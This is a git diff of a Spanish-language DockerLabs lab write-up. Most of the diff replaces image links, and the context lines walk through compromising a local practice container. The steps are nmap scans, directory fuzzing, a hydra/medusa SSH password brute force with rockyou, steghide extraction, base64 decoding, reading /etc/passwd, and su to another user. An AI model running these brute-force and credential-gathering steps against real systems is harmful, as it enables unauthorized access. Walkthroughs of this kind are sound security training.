@@ -31,7 +31,7 @@ Realizamos enumaeración a los puertos abiertos.
 nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
 ~~~
 
-![Escaneo_Sevicios](https://i.imgur.com/6ybGn1A.png)
+![Escaneo_Sevicios](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ServicesScan.png)
 - `-sC`: Ejecuta scripts NSE (Nmap Scripting Engine) predeterminados.
 - `-sV`: Detecta la versión del servicio que se está ejecutando en cada puerto abierto.
 _____________________________________________________________________________________________________________________________________________________________________
@@ -45,11 +45,11 @@ Vemos el puerto `80` que corresponde a un servicio `http`, veamos que hay en él
 whatweb http://172.17.0.2
 ~~~
 
-![whatweb](https://i.imgur.com/iz3f6TK.png)
+![whatweb](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/whatweb.png)
 
 Abrimos en navegador y vamos a dicha web, leemos y podemos ver algo interesante, una nota de `Carlota`.
 Yo siempre reviso view-source de la web por si se me escapa algo interesante.
-![despido](https://i.imgur.com/JTVpkU4.png)
+![despido](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/despidoempleado.png)
 
 _____________________________________________________________________________________________________________________________________________________________________
 
@@ -64,7 +64,7 @@ El siguiente paso será intentar descubrir posibles directorios, podemos usar cu
 wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://172.17.0.2/FUZZ
 ~~~
 
-![wfuzz](https://i.imgur.com/GEns8Jg.png)
+![wfuzz](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/zfuzz.png)
 
 - `-c`: Formato colorizado
 - `--hc=404`: Ocultar el código de estado 404 (Not Found)
@@ -78,7 +78,7 @@ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ~~~
 
-![gobuster](https://i.imgur.com/qsO45ms.png)
+![gobuster](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/burp.png)
 
 - `dir`: Modo de descubrimiento de directorios y archivos
 - `-u`: Dirección URL
@@ -107,7 +107,7 @@ hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
 ~~~ bash
 medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
 ~~~
-![gobuster](https://i.imgur.com/phRZEFc.png)
+![medusa](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/medusa.png)
 
 - `-h`: Especifica la dirección IP del objetivo.
 - `-u`: Especifica el nombre de usuario a probar.
@@ -131,26 +131,26 @@ export TERM=xterm
 
 En primer lugar veremos si tenemos privilegios `sudo` mediante `sudo -l`, pero no hay suerte. Seguimos enumerando y vemos una imagen en una carpeta de Carlota.
 
-![estego]()
+![estego](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/estego.png)
 
 Vamos a comprobar si tiene información oculta. En primer lugar nos la descargamos, para ello lo vamos a hacer de dos modos diferentes, es bueno saver varias maneras de hacer las cosas ya que no siempre funcionan los mismos metodos.
 
 ~~~ bash
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /opt/amor
 ~~~
-![scp]()
+![scp](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/scp.png)
 El segundo sería crear un servidor temporal con python y descargarla desde el lado del atacante.
 
 ~~~ bash
 Victima
 python3 -m http.server 8080
 ~~~
-![httpserver]()
+![httpserver](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/httpserver.png)
 ~~~
 Atacante
 wget http://172.17.0.2:8080/imagen.jpg
 ~~~
-![wget]()
+![wget](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/wget.png)
 
 
 ## Esteganografía
@@ -163,14 +163,14 @@ Con las opciones extract y sf estraemos los metadatos si los hubiera en un archi
 steghiede extract -sf imagen.jpg
 ~~~
 El contenido del archivo parece estar codificado en base64.
-![base64]()
+![base64](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/)
 
 Decodificamos con un simple comando.
 
 ~~~
 cat secret.txt | base64 -d
 ~~~
-![decode]()
+![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/)
 
 Probamos el resultado para escalar a root pero no hay suerte. Revisamos el archivo /etc/passwd para ver los usuarios.
 Obseramos tres usuarios activos, oscar, carlota y root.
@@ -178,14 +178,14 @@ Obseramos tres usuarios activos, oscar, carlota y root.
 ~~~
 cat /etc/passwd
 ~~~
-![users]()
+![users](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/)
 
 Intentamos usar la contraseña encoontrada en Oscar y parece que funciona.
 ~~~
 su oscar
 whoami
 ~~~
-![decode]()
+![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/)
 
 
 
